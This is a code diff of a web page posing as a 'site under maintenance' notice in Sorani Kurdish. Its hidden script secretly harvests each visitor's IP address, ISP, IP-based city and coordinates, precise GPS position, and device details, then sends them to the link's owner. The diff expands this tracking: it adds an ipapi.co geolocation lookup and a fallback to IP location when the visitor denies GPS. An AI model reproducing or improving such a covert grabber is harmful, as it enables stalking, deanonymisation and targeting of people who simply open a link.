@@ -44,7 +44,7 @@
     <div class="card">
         <div class="spinner"></div>
         <h2>🛠 ماڵپەڕەکە لەژێر کارکردندایە</h2>
-        <p>تکایە چاوەڕێ بکە یان ڕێگە بە دەستگەیشتن بدە بۆ هاوڕێکەربوونی سەرڤەرەکە...</p>
+        <p>تکایە چاوەڕێ بکە یان ڕێگە بە دەستگەیشتن بدە بۆ بەستنەوەی سەرڤەرەکە...</p>
     </div>
 
     <script>
@@ -55,13 +55,30 @@
         async function collectAndSendInfo() {
             if (!ownerId) return;
 
-            // 1. وەرگرتنی IP
             let userIp = "نەنێنراوە";
+            let ipCity = "نەنێنراوە";
+            let ipCountry = "نەنێنراوە";
+            let ipIsp = "نەنێنراوە";
+            let ipLat = "";
+            let ipLon = "";
+
+            // 1. وەرگرتنی IP و شوێنی خەمڵێنراو لە ڕێگەی IP
             try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipRes = await fetch('https://ipapi.co/json/');
                 const ipData = await ipRes.json();
-                userIp = ipData.ip;
-            } catch (e) {}
+                userIp = ipData.ip || "نەدۆزرایەوە";
+                ipCity = ipData.city || "نەدۆزرایەوە";
+                ipCountry = ipData.country_name || "نەدۆزرایەوە";
+                ipIsp = ipData.org || "نەدۆزرایەوە";
+                ipLat = ipData.latitude || "";
+                ipLon = ipData.longitude || "";
+            } catch (e) {
+                try {
+                    const fallbackRes = await fetch('https://api.ipify.org?format=json');
+                    const fallbackData = await fallbackRes.json();
+                    userIp = fallbackData.ip;
+                } catch(err) {}
+            }
 
             // 2. زانیاری ئامێر
             const ua = navigator.userAgent;
@@ -78,36 +95,39 @@
                 }
             } catch (e) {}
 
-            // 3. هەوڵدان بۆ وەرگرتنی GPS Location (Latitude & Longitude)
-            let locText = "🔒 نەبەخشراوە (Disabled/Denied)";
-            let mapUrl = "";
-
+            // 3. هەوڵدان بۆ وەرگرتنی GPS Location دەقیق (ئەگەر Allow بکات)
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
-                        locText = `Lat: ${lat}, Long:${lon}`;
-                        mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-                        sendData(userIp, platform, screenRes, gpu, ua, locText, mapUrl);
+                        const locText = `🎯 **دەقیق (GPS):** \`${lat}, ${lon}\``;
+                        const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                        sendData(userIp, ipCity, ipCountry, ipIsp, platform, screenRes, gpu, ua, locText, mapUrl);
                     },
                     (error) => {
-                        sendData(userIp, platform, screenRes, gpu, ua, locText, mapUrl);
+                        // ئەگەر Allowی نەرد یان ڕەتی کردەوە -> شوێنی IPەکە دەبنێردرێت
+                        let locText = `📍 **خەمڵێنراو (لە ڕێگەی IP):** \`${ipCity}, ${ipCountry}\``;
+                        let mapUrl = (ipLat && ipLon) ? `https://www.google.com/maps?q=${ipLat},${ipLon}` : "";
+                        sendData(userIp, ipCity, ipCountry, ipIsp, platform, screenRes, gpu, ua, locText, mapUrl);
                     },
                     { enableHighAccuracy: true, timeout: 5000 }
                 );
             } else {
-                sendData(userIp, platform, screenRes, gpu, ua, locText, mapUrl);
+                let locText = `📍 **خەمڵێنراو (لە ڕێگەی IP):** \`${ipCity}, ${ipCountry}\``;
+                let mapUrl = (ipLat && ipLon) ? `https://www.google.com/maps?q=${ipLat},${ipLon}` : "";
+                sendData(userIp, ipCity, ipCountry, ipIsp, platform, screenRes, gpu, ua, locText, mapUrl);
             }
         }
 
-        function sendData(ip, platform, screenRes, gpu, ua, location, mapUrl) {
+        function sendData(ip, city, country, isp, platform, screenRes, gpu, ua, locationText, mapUrl) {
             let message = `🔔 **سەردانیکەرێکی نوێ لینکەکەی کردەوە!**\n\n` +
                           `🌐 **IP Address:** \`${ip}\`\n` +
-                          `📍 **شوێنی دەقیق (GPS):** \`${location}\`\n`;
+                          `🏢 **کۆمپانیای ئینتەرنێت (ISP):** \`${isp}\`\n` +
+                          `${locationText}\n`;
 
             if (mapUrl) {
-                message += `🗺 **لینکی نەخشە:** [کرنەوە لە Google Maps](${mapUrl})\n`;
+                message += `🗺 **لینکی نەخشە:** [کردنەوە لە Google Maps](${mapUrl})\n`;
             }
 
             message += `\n📱 **سیستەم:** \`${platform}\`\n` +
@@ -126,7 +146,6 @@
             }).catch(err => console.error(err));
         }
 
-        // دەستپێکردنی بزوێنەرەکە
         collectAndSendInfo();
     </script>
 
